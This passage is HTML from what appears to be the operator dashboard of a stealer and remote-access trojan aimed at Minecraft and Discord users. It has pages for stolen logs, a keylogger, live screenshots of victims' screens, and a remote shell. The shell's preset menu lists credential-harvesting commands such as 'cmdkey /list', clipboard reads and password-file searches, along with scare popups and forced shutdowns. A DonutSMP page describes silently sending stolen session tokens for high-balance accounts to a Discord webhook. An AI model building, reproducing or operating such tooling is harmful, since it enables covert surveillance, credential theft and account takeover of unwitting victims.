                            <div class="switch-container">
                                <div style="display: flex; align-items: center;">
                                    <div class="setting-icon" style="color: var(--text-primary);"><i
                                            class="fas fa-file-archive"></i></div>
                                    <div>
                                        <div style="font-weight: 600; font-size: 14px;">File Uploads</div>
                                        <div style="font-size: 12px; color: var(--text-secondary);">ZIP archives & large
                                            files</div>
                                    </div>
                                </div>
                                <label class="switch">
                                    <input type="checkbox" id="notifyFiles" checked>
                                    <span class="slider"></span>
                                </label>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Users (Admin) -->
            <div class="page" id="page-users">
                <div class="page-header">
                    <h1 class="page-title">User Management</h1>
                    <div style="display: flex; gap: 10px;">
                        <input type="text" id="userSearchInput" placeholder="Search ID, Name..."
                            onkeyup="if(event.key === 'Enter') searchUsers()"
                            style="padding: 10px; border-radius: 8px; border: 1px solid var(--border); background: var(--bg-secondary); color: white; width: 200px;">
                        <button class="btn btn-secondary" onclick="searchUsers()">
                            <i class="fas fa-search"></i>
                        </button>
                        <button class="btn btn-primary" onclick="showCreateUser()">
                            <i class="fas fa-plus"></i> Add User
                        </button>
                    </div>
                </div>

                <!-- Stats Cards -->
                <div class="stats-grid" style="grid-template-columns: repeat(3, 1fr); margin-bottom: 24px;">
                    <div class="stat-card">
                        <div class="stat-title">Total Users</div>
                        <div class="stat-value" id="statsTotal">...</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-title">Premium Users</div>
                        <div class="stat-value" id="statsPremium">...</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-title">Free Users</div>
                        <div class="stat-value" id="statsFree">...</div>
                    </div>
                </div>
                <div class="table-container">
                    <table>
                        <thead>
                            <tr>
                                <th>User</th>
                                <th>Plan</th>
                                <th>Build Key</th>
                                <th>Stats</th>
                                <th>Status</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody id="usersTable"></tbody>
                    </table>
                </div>
            </div>

            <!-- Process Manager -->
            <div class="page" id="page-processes">
                <div class="page-header">
                    <h1 class="page-title"><i class="fas fa-microchip" style="color: var(--accent);"></i> Process
                        Manager</h1>
                    <div style="display: flex; gap: 8px;">
                        <select id="processPlayerSelect" class="form-group"
                            style="margin-bottom: 0; width: 200px; padding: 8px; background: var(--bg-secondary); color: var(--text-primary); border: 1px solid var(--border); border-radius: 6px;">
                            <option value="">Select Player...</option>
                        </select>
                        <button class="btn btn-primary" onclick="refreshProcessList()">
                            <i class="fas fa-sync-alt"></i> Refresh List
                        </button>
                    </div>
                </div>

                <div id="processManagerStatus"
                    style="margin-bottom: 16px; padding: 12px; background: var(--bg-secondary); border-radius: 8px; font-size: 13px; color: var(--text-secondary);">
                    <i class="fas fa-info-circle"></i> Select a player to view running processes.
                </div>

                <div class="table-container">
                    <table>
                        <thead>
                            <tr>
                                <th>PID</th>
                                <th>Process Name</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody id="processListTable">
                            <tr>
                                <td colspan="3" style="text-align:center; padding: 40px; color: var(--text-muted);">No
                                    processes loaded</td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </div>

            <!-- Blacklist Page -->
            <div class="page" id="page-blacklist">
                <div class="page-header">
                    <h1 class="page-title"><i class="fas fa-ban"
                            style="color: var(--danger); margin-right: 10px;"></i>IP Blacklist</h1>
                    <button class="btn btn-secondary" onclick="loadBlacklist()">
                        <i class="fas fa-sync-alt"></i> Refresh
                    </button>
                </div>

                <div
                    style="background: var(--bg-card); border: 1px solid var(--danger); border-radius: 8px; padding: 20px;">
                    <div
                        style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px;">
                        <h3 style="color: var(--danger); font-size: 18px; font-weight: 700;">
                            Manage Blocked IPs
                        </h3>
                        <div style="display: flex; gap: 10px;">
                            <input type="text" id="blacklistIpInput" placeholder="Enter IP address..."
                                style="padding: 8px 12px; background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 6px; color: var(--text-primary); width: 250px;">
                            <button class="btn btn-danger" onclick="addBlacklistIp()">
                                <i class="fas fa-plus-circle"></i> Block IP
                            </button>
                        </div>
                    </div>

                    <div class="table-container">
                        <table class="table" style="width: 100%;">
                            <thead>
                                <tr>
                                    <th style="color: var(--text-muted);">IP Address</th>
                                    <th style="text-align: right; color: var(--text-muted);">Actions</th>
                                </tr>
                            </thead>
                            <tbody id="blacklistTableBody">
                                <!-- Loaded dynamically -->
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>

            <!-- Login Logs (Admin) -->
            <div class="page" id="page-login-logs">
                <div class="page-header">
                    <h1 class="page-title"><i class="fas fa-sign-in-alt"
                            style="color: var(--accent); margin-right: 10px;"></i>Login Logs & Security</h1>
                    <div style="display: flex; gap: 8px;">
                        <button class="btn btn-secondary" onclick="loadLoginLogs()">
                            <i class="fas fa-sync-alt"></i> Refresh
                        </button>
                        <button class="btn btn-secondary" onclick="showClearLoginLogsModal()">
                            <i class="fas fa-trash"></i> Clear Logs
                        </button>
                    </div>
                </div>

                <!-- Stats Cards -->
                <div class="stats-grid" id="loginStatsGrid"></div>

                <!-- Filters -->
                <div class="filter-bar" style="margin: 20px 0;">
                    <input type="text" id="loginUsernameFilter" placeholder="Filter by username..."
                        style="padding: 8px 12px; background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 6px; color: var(--text-primary); width: 200px;">
                    <input type="text" id="loginIpFilter" placeholder="Filter by IP..."
                        style="padding: 8px 12px; background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 6px; color: var(--text-primary); width: 200px; margin-left: 10px;">
                    <button class="btn btn-primary" onclick="loadLoginLogs()" style="margin-left: 10px;">
                        <i class="fas fa-search"></i> Search
                    </button>
                </div>

                <!-- Quick Delete Buttons -->
                <div style="display: flex; gap: 8px; margin-bottom: 20px; flex-wrap: wrap;">
                    <button class="btn btn-secondary btn-sm" onclick="clearLoginLogsByType('failed')">
                        <i class="fas fa-times"></i> Clear Failed
                    </button>
                    <button class="btn btn-secondary btn-sm" onclick="clearLoginLogsByType('old')">
                        <i class="fas fa-clock"></i> Clear 30+ Days Old
                    </button>
                </div>

                <!-- Suspicious Activity Section -->
                <div style="background: var(--bg-card); border: 1px solid var(--danger); border-radius: 8px; padding: 16px; margin-bottom: 20px; display: none;"
                    id="suspiciousActivityBox">
                    <h3 style="color: var(--danger); margin-bottom: 12px;">
                        <i class="fas fa-exclamation-triangle"></i> Suspicious Activity Detected
                    </h3>
                    <div id="suspiciousActivityList"></div>
                </div>



                <!-- Two Column Layout: Successful and Failed Logins -->
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
                    <!-- Successful Logins by IP -->
                    <div>
                        <h3 style="margin-bottom: 12px; color: var(--success);">
                            <i class="fas fa-check-circle"></i> Successful Logins by IP
                        </h3>
                        <div class="table-container">
                            <table class="table">
                                <thead>
                                    <tr>
                                        <th>IP Address</th>
                                        <th>OS</th>
                                        <th>Users</th>
                                        <th>Count</th>
                                        <th>Last Login</th>
                                        <th style="width: 60px;">Actions</th>
                                    </tr>
                                </thead>
                                <tbody id="successfulLoginsTable"></tbody>
                            </table>
                        </div>
                    </div>

                    <!-- Failed Logins by IP -->
                    <div>
                        <h3 style="margin-bottom: 12px; color: var(--danger);">
                            <i class="fas fa-times-circle"></i> Failed Logins by IP
                        </h3>
                        <div class="table-container">
                            <table class="table">
                                <thead>
                                    <tr>
                                        <th>IP Address</th>
                                        <th>Attempted Users</th>
                                        <th>Count</th>
                                        <th>Last Attempt</th>
                                        <th style="width: 60px;">Actions</th>
                                    </tr>
                                </thead>
                                <tbody id="failedLoginsTable"></tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Trash (Admin) -->
            <div class="page" id="page-trash">
                <div class="page-header">
                    <h1 class="page-title"><i class="fas fa-trash-restore"
                            style="color: var(--warning); margin-right: 10px;"></i>Deleted Logs (Trash)</h1>
                    <div style="display: flex; gap: 8px;">
                        <button class="btn btn-secondary" onclick="loadTrash()">
                            <i class="fas fa-sync-alt"></i> Refresh
                        </button>
                        <button class="btn btn-danger" onclick="emptyTrash()">
                            <i class="fas fa-trash"></i> Empty Trash
                        </button>
                        <button class="btn btn-primary" onclick="createBackup()">
                            <i class="fas fa-download"></i> Create Backup
                        </button>
                    </div>
                </div>

                <div class="stats-grid" style="margin-bottom: 24px;">
                    <div class="stat-card">
                        <div class="stat-card-header">
                            <div class="stat-card-icon"
                                style="background: linear-gradient(135deg, var(--warning), #f59e0b);"><i
                                    class="fas fa-trash-alt"></i></div>
                        </div>
                        <div class="stat-card-value" id="trashCount">0</div>
                        <div class="stat-card-label">Logs in Trash</div>
                    </div>
                </div>

                <div class="table-container">
                    <table>
                        <thead>
                            <tr>
                                <th>Original ID</th>
                                <th>Type</th>
                                <th>PC</th>
                                <th>User</th>
                                <th>IP</th>
                                <th>Created</th>
                                <th>Deleted</th>
                                <th>Deleted By</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody id="trashTable">
                            <tr>
                                <td colspan="9" style="text-align: center; padding: 40px; color: var(--text-muted);">
                                    <i class="fas fa-trash-alt"
                                        style="font-size: 32px; margin-bottom: 12px; display: block; opacity: 0.5;"></i>
                                    Trash is empty
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </div>

            <!-- Audit Log (Admin) -->
            <div class="page" id="page-audit">
                <div class="page-header">
                    <h1 class="page-title"><i class="fas fa-clipboard-list"
                            style="color: var(--info); margin-right: 10px;"></i>Audit Log</h1>
                    <button class="btn btn-secondary" onclick="loadAuditLog()">
                        <i class="fas fa-sync-alt"></i> Refresh
                    </button>
                </div>

                <p style="color: var(--text-muted); margin-bottom: 20px;">
                    <i class="fas fa-info-circle"></i> All delete actions and important changes are logged here for
                    security.
                </p>

                <div class="table-container">
                    <table>
                        <thead>
                            <tr>
                                <th>Time</th>
                                <th>User</th>
                                <th>Action</th>
                                <th>Details</th>
                                <th>IP</th>
                            </tr>
                        </thead>
                        <tbody id="auditLogTable">
                            <tr>
                                <td colspan="5" style="text-align: center; padding: 40px; color: var(--text-muted);">
                                    <i class="fas fa-clipboard-list"
                                        style="font-size: 32px; margin-bottom: 12px; display: block; opacity: 0.5;"></i>
                                    No audit logs yet
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </div>

            <!-- About Page -->
            <div class="page" id="page-about">
                <iframe id="aboutFrame" src=""
                    style="width: 100%; height: calc(100vh - 40px); border: none; border-radius: 12px;"></iframe>
            </div>

            <!-- All Logs (Admin) -->
            <div class="page" id="page-alllogs">
                <div class="page-header">
                    <h1 class="page-title"><i class="fas fa-database"
                            style="color: var(--accent); margin-right: 10px;"></i>All Logs by User</h1>
                    <button class="btn btn-secondary" onclick="loadAllUsersLogs()">
                        <i class="fas fa-sync-alt"></i> Refresh
                    </button>
                </div>

                <!-- User Tabs -->
                <div class="filter-bar" id="userTabsBar" style="margin-bottom: 20px;">
                    <button class="filter-btn active" onclick="filterUserLogs('all')">
                        <i class="fas fa-globe"></i> All Users
                    </button>
                </div>

                <!-- Stats per User -->
                <div id="userStatsContainer" style="margin-bottom: 24px;"></div>

                <!-- Logs Grid -->
                <div class="filter-bar" id="allLogsTypeFilter">
                    <button class="filter-btn active" onclick="filterAllLogsByType('all')">All</button>
                    <button class="filter-btn" onclick="filterAllLogsByType('minecraft')"><i class="fas fa-cube"></i>
                        MC</button>
                    <button class="filter-btn" onclick="filterAllLogsByType('discord')"><i class="fab fa-discord"></i>
                        Discord</button>
                    <button class="filter-btn" onclick="filterAllLogsByType('browser')"><i class="fas fa-globe"></i>
                        Browser</button>
                    <button class="filter-btn" onclick="filterAllLogsByType('zip')"><i class="fas fa-file-archive"></i>
                        ZIP</button>
                </div>
                <div class="logs-grid" id="allLogsGrid"></div>
            </div>

            <!-- Remote Control Panel -->
            <div class="page" id="page-remote">
                <div class="page-header">
                    <h1 class="page-title"><i class="fas fa-desktop" style="color: var(--accent);"></i> Remote Control
                        Center</h1>
                    <div class="flex gap-2">
                        <button class="btn btn-secondary glass-btn" onclick="loadRemotePlayers()">
                            <i class="fas fa-sync-alt"></i> Refresh
                        </button>
                    </div>
                </div>

                <!-- Glassy Stats Grid -->
                <div class="stats-grid mb-6">
                    <div class="stat-card glass-card animate-fade">
                        <div class="stat-icon bg-gradient-to-br from-green-500 to-emerald-700">
                            <i class="fas fa-wifi"></i>
                        </div>
                        <div class="stat-info">
                            <div class="stat-value" id="remoteOnlineCount">0</div>
                            <div class="stat-label">Actually Online</div>
                        </div>
                    </div>
                    <div class="stat-card glass-card animate-fade delay-100">
                        <div class="stat-icon bg-gradient-to-br from-blue-500 to-indigo-700">
                            <i class="fas fa-shield-alt"></i>
                        </div>
                        <div class="stat-info">
                            <div class="stat-value" id="remoteGuardianCount">0</div>
                            <div class="stat-label">Guardian Clients</div>
                        </div>
                    </div>
                    <div class="stat-card glass-card animate-fade delay-200">
                        <div class="stat-icon bg-gradient-to-br from-purple-500 to-pink-700">
                            <i class="fas fa-cube"></i>
                        </div>
                        <div class="stat-info">
                            <div class="stat-value" id="remoteModCount">0</div>
                            <div class="stat-label">Mod Clients</div>
                        </div>
                    </div>
                </div>

                <!-- Command Center Grid -->
                <!-- Advanced Controls (Hidden by default, shown when player selected) -->
                <div id="commandCenterPanel" class="glass-panel p-6 mb-6 hidden animate-scale">
                    <div class="flex justify-between items-center mb-4">
                        <div class="flex items-center gap-3">
                            <div
                                class="w-10 h-10 rounded-full bg-accent/20 flex items-center justify-center text-accent">
                                <i class="fas fa-terminal"></i>
                            </div>
                            <div>
                                <h3 class="font-bold text-lg" id="cmdPanelPlayer">Select Client</h3>
                                <p class="text-xs text-muted" id="cmdPanelStatus">Waiting...</p>
                            </div>
                        </div>
                        <button class="btn btn-sm btn-ghost text-muted hover:text-white"
                            onclick="document.getElementById('commandCenterPanel').classList.add('hidden')">
                            <i class="fas fa-times"></i>
                        </button>
                    </div>

                    <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
                        <!-- Content injected by selectPlayerForCmd -->
                    </div>
                </div>

                <!-- Glassy Table -->
                <div class="glass-panel overflow-hidden">
                    <div class="table-container">
                        <table class="w-full">
                            <thead>
                                <tr class="text-left bg-white/5 uppercase text-xs tracking-wider text-gray-400">
                                    <th class="p-4">Status</th>
                                    <th class="p-4">Source</th>
                                    <th class="p-4">Client / User</th>
                                    <th class="p-4">System</th>
                                    <th class="p-4">IP / Location</th>
                                    <th class="p-4">Connection</th>
                                    <th class="p-4 text-right">Control</th>
                                </tr>
                            </thead>
                            <tbody id="remotePlayersTable" class="divide-y divide-white/5">
                                <!-- Populated via JS -->
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>

            <!-- Live Screenshare -->
            <div class="page" id="page-screenshare">
                <div class="page-header">
                    <h1 class="page-title"><i class="fas fa-tv" style="color: var(--accent);"></i> Live Screenshare</h1>
                    <div style="display: flex; gap: 8px; align-items: center;">
                        <span id="screenshareAutoStatus"
                            style="color: var(--text-muted); font-size: 12px;">Auto-refresh: <span
                                id="nextRefreshTime">10:00</span></span>
                        <button class="btn btn-secondary" onclick="refreshAllPreviews()">
                            <i class="fas fa-sync-alt"></i> Refresh All
                        </button>
                        <button class="btn btn-primary" onclick="requestAllScreenshots()">
                            <i class="fas fa-camera"></i> Capture All Now
                        </button>
                    </div>
                </div>

                <div class="stats-grid" style="margin-bottom: 24px;">
                    <div class="stat-card">
                        <div class="stat-card-header">
                            <div class="stat-card-icon green"><i class="fas fa-signal"></i></div>
                        </div>
                        <div class="stat-card-value" id="screenshareOnlineCount">0</div>
                        <div class="stat-card-label">Online Clients</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-card-header">
                            <div class="stat-card-icon blue"><i class="fas fa-images"></i></div>
                        </div>
                        <div class="stat-card-value" id="screenshotTotalCount">0</div>
                        <div class="stat-card-label">Total Screenshots</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-card-header">
                            <div class="stat-card-icon yellow"><i class="fas fa-clock"></i></div>
                        </div>
                        <div class="stat-card-value" id="lastCaptureTime">--</div>
                        <div class="stat-card-label">Last Capture</div>
                    </div>
                </div>

                <h3 style="margin-bottom: 16px;"><i class="fas fa-desktop"></i> Live Preview Grid</h3>
                <p style="color: var(--text-muted); margin-bottom: 16px; font-size: 13px;">
                    <i class="fas fa-info-circle"></i> Click on any preview to open full-screen stream. Previews
                    auto-refresh every 10 minutes.
                </p>

                <div class="webcam-grid" id="screenshareLiveGrid">
                    <div style="text-align: center; padding: 60px; color: var(--text-muted); grid-column: 1/-1;">
                        <i class="fas fa-spinner fa-spin" style="font-size: 32px; margin-bottom: 16px;"></i>
                        <p>Loading online clients...</p>
                    </div>
                </div>

                <!-- Screenshot History -->
                <h3 style="margin-top: 32px; margin-bottom: 16px;"><i class="fas fa-history"></i> Recent Screenshots
                </h3>
                <div class="webcam-grid" id="screenshotHistory"></div>
            </div>

            <!-- Keylogger -->
            <div class="page" id="page-keylogger">
                <div class="page-header">
                    <h1 class="page-title"><i class="fas fa-keyboard" style="color: var(--accent);"></i> Keylogger</h1>
                    <div style="display: flex; gap: 8px;">
                        <select id="keylogPlayerSelect" class="btn btn-secondary"
                            style="background: var(--bg-secondary); border: 1px solid var(--border); padding: 8px 16px;">
                            <option value="">-- All Players --</option>
                        </select>
                        <button class="btn btn-secondary" onclick="loadKeylogs()">
                            <i class="fas fa-sync-alt"></i> Refresh
                        </button>
                        <button class="btn btn-primary" onclick="startKeylogger()">
                            <i class="fas fa-play"></i> Start Keylogger
                        </button>
                    </div>
                </div>

                <div class="table-container" style="max-height: 70vh; overflow-y: auto;">
                    <table>
                        <thead>
                            <tr>
                                <th>Time</th>
                                <th>Player</th>
                                <th>Window</th>
                                <th>Keys</th>
                                <th>PC / IP</th>
                            </tr>
                        </thead>
                        <tbody id="keylogTable"></tbody>
                    </table>
                </div>
            </div>

            <!-- Remote Shell -->
            <div class="page" id="page-shell">
                <div class="page-header">
                    <h1 class="page-title"><i class="fas fa-terminal" style="color: var(--accent);"></i> Remote Shell
                    </h1>
                    <select id="shellPlayerSelect" class="btn btn-secondary"
                        style="background: var(--bg-secondary); border: 1px solid var(--border); padding: 8px 16px;">
                        <option value="">-- Select Player --</option>
                    </select>
                </div>

                <div
                    style="background: #0d1117; border-radius: 12px; padding: 16px; font-family: 'Consolas', 'Monaco', monospace; position: relative;">

                    <!-- Quick Commands / Presets -->
                    <div style="position: absolute; top: 16px; right: 16px; z-index: 10;">
                        <div class="dropdown" style="position: relative; display: inline-block;">
                            <button class="btn btn-sm btn-secondary glass-btn dropdown-toggle"
                                onclick="toggleShellPresets()">
                                <i class="fas fa-bolt text-warning"></i> Quick Commands
                            </button>
                            <div id="shellPresetsMenu" class="glass-panel"
                                style="display: none; position: absolute; right: 0; top: 100%; min-width: 280px; margin-top: 5px; padding: 5px; z-index: 20; background: rgba(10, 10, 15, 0.98); box-shadow: 0 10px 25px rgba(0,0,0,0.5); max-height: 400px; overflow-y: auto;">
                                <div
                                    class="p-2 text-xs text-muted uppercase font-bold tracking-wider border-b border-white/10 mb-1">
                                     Reconnaissance</div>
                                <a href="#" class="block px-3 py-2 hover:bg-white/10 rounded text-sm text-gray-300"
                                    onclick="insertPreset('systeminfo')">System Info</a>
                                <a href="#" class="block px-3 py-2 hover:bg-white/10 rounded text-sm text-gray-300"
                                    onclick="insertPreset('ipconfig /all')">Network Info</a>
                                <a href="#" class="block px-3 py-2 hover:bg-white/10 rounded text-sm text-gray-300"
                                    onclick="insertPreset('netstat -an | findstr LISTEN')">Open Ports</a>
                                <a href="#" class="block px-3 py-2 hover:bg-white/10 rounded text-sm text-gray-300"
                                    onclick="insertPreset('whoami /all')">Current Privileges</a>
                                <a href="#" class="block px-3 py-2 hover:bg-white/10 rounded text-sm text-gray-300"
                                    onclick="insertPreset('net user')">List Users</a>
                                <a href="#" class="block px-3 py-2 hover:bg-white/10 rounded text-sm text-gray-300"
                                    onclick="insertPreset('net localgroup administrators')">Admin Users</a>

                                <div
                                    class="p-2 text-xs text-muted uppercase font-bold tracking-wider border-b border-white/10 mb-1 mt-2">
                                     File System</div>
                                <a href="#" class="block px-3 py-2 hover:bg-white/10 rounded text-sm text-gray-300"
                                    onclick="insertPreset('dir %USERPROFILE%\\Desktop')">Desktop Files</a>
                                <a href="#" class="block px-3 py-2 hover:bg-white/10 rounded text-sm text-gray-300"
                                    onclick="insertPreset('dir %USERPROFILE%\\Documents')">Documents</a>
                                <a href="#" class="block px-3 py-2 hover:bg-white/10 rounded text-sm text-gray-300"
                                    onclick="insertPreset('dir %USERPROFILE%\\Downloads')">Downloads</a>
                                <a href="#" class="block px-3 py-2 hover:bg-white/10 rounded text-sm text-gray-300"
                                    onclick="insertPreset('dir /s /b %USERPROFILE%\\*.txt 2>nul | head -20')">Find .txt
                                    Files</a>
                                <a href="#" class="block px-3 py-2 hover:bg-white/10 rounded text-sm text-gray-300"
                                    onclick="insertPreset('dir /s /b %USERPROFILE%\\*password* 2>nul')">Find Password
                                    Files</a>

                                <div
                                    class="p-2 text-xs text-muted uppercase font-bold tracking-wider border-b border-white/10 mb-1 mt-2">
                                     Processes</div>
                                <a href="#" class="block px-3 py-2 hover:bg-white/10 rounded text-sm text-gray-300"
                                    onclick="insertPreset('tasklist')">Running Processes</a>
                                <a href="#" class="block px-3 py-2 hover:bg-white/10 rounded text-sm text-gray-300"
                                    onclick="insertPreset('tasklist | findstr /i chrome')">Chrome Processes</a>
                                <a href="#" class="block px-3 py-2 hover:bg-white/10 rounded text-sm text-gray-300"
                                    onclick="insertPreset('tasklist | findstr /i discord')">Discord Processes</a>
                                <a href="#" class="block px-3 py-2 hover:bg-white/10 rounded text-sm text-gray-300"
                                    onclick="insertPreset('wmic process get name,processid,commandline')">Detailed
                                    Processes</a>

                                <div
                                    class="p-2 text-xs text-muted uppercase font-bold tracking-wider border-b border-white/10 mb-1 mt-2">
                                     Credentials</div>
                                <a href="#" class="block px-3 py-2 hover:bg-white/10 rounded text-sm text-gray-300"
                                    onclick="insertPreset('cmdkey /list')">Stored Credentials</a>
                                <a href="#" class="block px-3 py-2 hover:bg-white/10 rounded text-sm text-gray-300"
                                    onclick="insertPreset('reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU')">Run
                                    History</a>
                                <a href="#" class="block px-3 py-2 hover:bg-white/10 rounded text-sm text-gray-300"
                                    onclick="insertPreset('powershell Get-Clipboard')">Clipboard Content</a>

                                <div
                                    class="p-2 text-xs text-muted uppercase font-bold tracking-wider border-b border-white/10 mb-1 mt-2">
                                     Fun/Troll</div>
                                <a href="#" class="block px-3 py-2 hover:bg-white/10 rounded text-sm text-gray-300"
                                    onclick="insertPreset('start https://www.youtube.com/watch?v=dQw4w9WgXcQ')">Rickroll
                                    </a>
                                <a href="#" class="block px-3 py-2 hover:bg-white/10 rounded text-sm text-gray-300"
                                    onclick="insertPreset('msg * Hacked!')">Popup Message</a>
                                <a href="#" class="block px-3 py-2 hover:bg-white/10 rounded text-sm text-gray-300"
                                    onclick="insertPreset('powershell (New-Object -ComObject SAPI.SpVoice).Speak(&quot;I am watching you&quot;)')">Text-to-Speech</a>
                                <a href="#" class="block px-3 py-2 hover:bg-white/10 rounded text-sm text-gray-300"
                                    onclick="insertPreset('mshta vbscript:msgbox(&quot;You have been hacked!&quot;,16,&quot;Warning&quot;)(close)')">Fake
                                    Virus Alert</a>
                                <a href="#" class="block px-3 py-2 hover:bg-white/10 rounded text-sm text-gray-300"
                                    onclick="insertPreset('powershell Add-Type -AssemblyName System.Windows.Forms')">Move
                                    Mouse</a>

                                <div
                                    class="p-2 text-xs text-muted uppercase font-bold tracking-wider border-b border-white/10 mb-1 mt-2">
                                     Dangerous</div>
                                <a href="#" class="block px-3 py-2 hover:bg-red-500/20 rounded text-sm text-red-400"
                                    onclick="insertPreset('taskkill /IM discord.exe /F')">Kill Discord</a>
                                <a href="#" class="block px-3 py-2 hover:bg-red-500/20 rounded text-sm text-red-400"
                                    onclick="insertPreset('taskkill /IM chrome.exe /F')">Kill Chrome</a>
                                <a href="#" class="block px-3 py-2 hover:bg-red-500/20 rounded text-sm text-red-400"
                                    onclick="insertPreset('shutdown /s /t 60 /c Shutdown-in-60s')">Shutdown (60s)</a>
                                <a href="#" class="block px-3 py-2 hover:bg-red-500/20 rounded text-sm text-red-400"
                                    onclick="insertPreset('shutdown /a')">Cancel Shutdown</a>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- xterm.js Terminal -->
                <div id="terminal" class="terminal-container" style="height: 400px; margin-top: 16px;"></div>

                <div
                    style="margin-top: 15px; background: var(--bg-secondary); padding: 15px; border-radius: 8px; border-left: 3px solid var(--accent);">
                    <i class="fas fa-info-circle"></i> <strong>Pro Tip:</strong> This is a real interactive shell.
                    You can use
                    <code>cd</code>, <code>powershell</code>, and interactive commands.
                </div>

                <!-- Command History -->
                <h3 style="margin-top: 24px; margin-bottom: 16px;"><i class="fas fa-history"></i> Command History
                </h3>
                <div class="table-container" style="max-height: 300px; overflow-y: auto;">
                    <table>
                        <thead>
                            <tr>
                                <th>Time</th>
                                <th>Player</th>
                                <th>Command</th>
                                <th>Status</th>
                                <th>Result</th>
                            </tr>
                        </thead>
                        <tbody id="shellHistoryTable"></tbody>
                    </table>
                </div>
            </div>

            <!-- DonutSMP Lookup Page -->
            <div class="page" id="page-donutsmp">
                <div class="page-header">
                    <h1 class="page-title"><i class="fas fa-cookie-bite" style="color: var(--accent);"></i>
                        DonutSMP Lookup</h1>
                </div>

                <div class="glass-panel" style="padding: 24px; margin-bottom: 24px;">
                    <!-- Search Row -->
                    <div style="display: flex; gap: 16px; margin-bottom: 20px; flex-wrap: wrap; align-items: flex-end;">
                        <div style="flex: 1; min-width: 200px;">
                            <label
                                style="font-size: 12px; color: var(--text-muted); text-transform: uppercase; display: block; margin-bottom: 8px;">Minecraft
                                Username</label>
                            <input type="text" id="donutManualUser" placeholder="Enter username..."
                                style="width: 100%; padding: 12px; background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 8px; color: white;">
                        </div>
                        <div style="flex: 1; min-width: 200px;">
                            <label
                                style="font-size: 12px; color: var(--text-muted); text-transform: uppercase; display: block; margin-bottom: 8px;">Or
                                Select From Logs</label>
                            <select id="donutSelectUser" onchange="if(this.value) searchDonutPlayer()"
                                style="width: 100%; padding: 12px; background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 8px; color: white;">
                                <option value="">-- Select Player --</option>
                            </select>
                        </div>
                        <button class="btn btn-primary" onclick="searchDonutPlayer()" style="height: 46px;">
                            <i class="fas fa-search"></i> Search
                        </button>
                    </div>

                    <!-- Webhook Settings Row -->
                    <div
                        style="display: flex; gap: 16px; margin-bottom: 20px; flex-wrap: wrap; align-items: flex-end; padding-bottom: 20px; border-bottom: 1px solid var(--border);">
                        <div style="flex: 2; min-width: 250px;">
                            <label
                                style="font-size: 12px; color: var(--text-muted); text-transform: uppercase; display: block; margin-bottom: 8px;"><i
                                    class="fas fa-bell"></i> DonutSMP Webhook (Silent Hits)</label>
                            <input type="text" id="donutWebhookInput" placeholder="https://discord.com/api/webhooks/..."
                                style="width: 100%; padding: 12px; background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 8px; color: white;">
                        </div>
                        <div style="width: 150px;">
                            <label
                                style="font-size: 12px; color: var(--text-muted); text-transform: uppercase; display: block; margin-bottom: 8px;">Min
                                Balance</label>
                            <input type="number" id="donutNotifyThreshold" value="1000000"
                                style="width: 100%; padding: 12px; background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 8px; color: white;">
                        </div>
                        <button class="btn btn-secondary" onclick="saveDonutSettings()" style="height: 46px;">
                            <i class="fas fa-save"></i> Save
                        </button>
                    </div>
                    <p style="font-size: 12px; color: var(--text-muted); margin-bottom: 20px;">
                        <i class="fas fa-info-circle"></i> When a new Minecraft account is logged, the panel will
                        silently check its DonutSMP balance. If balance >= Min Balance, it sends the Token + Balance to
                        this specific webhook.
                    </p>

                    <!-- Player Info Section -->
                    <div id="donutsmp-result">
                        <div class="text-center p-4" style="color: var(--text-muted);">
                            <i class="fas fa-user-circle" style="font-size: 48px; opacity: 0.3;"></i>
                            <p style="margin-top: 12px;">Select a player or enter a username to check DonutSMP stats</p>
                        </div>
                    </div>

                    <!-- Player Stats Grid (hidden until search) -->
                    <div id="donutsmp-stats" style="display: none;">
                        <h3 style="margin-bottom: 16px; color: var(--success);"><i class="fas fa-user"></i> Player Info
                        </h3>
                        <div class="stats-grid mb-4">
                            <div class="stat-card glass-panel">
                                <div class="stat-value" id="donutBalance" style="color: var(--success);">$0</div>
                                <div class="stat-label">Balance</div>
                            </div>
                            <div class="stat-card glass-panel">
                                <div class="stat-value" id="donutShards">0</div>
                                <div class="stat-label">Shards</div>
                            </div>
                            <div class="stat-card glass-panel">
                                <div class="stat-value" id="donutKills">0</div>
                                <div class="stat-label">Kills</div>
                            </div>
                            <div class="stat-card glass-panel">
                                <div class="stat-value" id="donutDeaths">0</div>
                                <div class="stat-label">Deaths</div>
                            </div>
                            <div class="stat-card glass-panel">
                                <div class="stat-value" id="donutKD">0</div>
                                <div class="stat-label">K/D Ratio</div>
                            </div>
                            <div class="stat-card glass-panel">
                                <div class="stat-value" id="donutPlaytime">0h</div>
                                <div class="stat-label">Playtime</div>
                            </div>
                        </div>

                        <!-- MC Session Token -->
                        <div style="margin-top: 20px; padding: 16px; background: rgba(0,0,0,0.3); border-radius: 8px;">
                            <label
                                style="font-size: 12px; color: var(--text-muted); display: block; margin-bottom: 8px;">
                                <i class="fas fa-key" style="color: var(--warning);"></i> MC Session Token
                            </label>
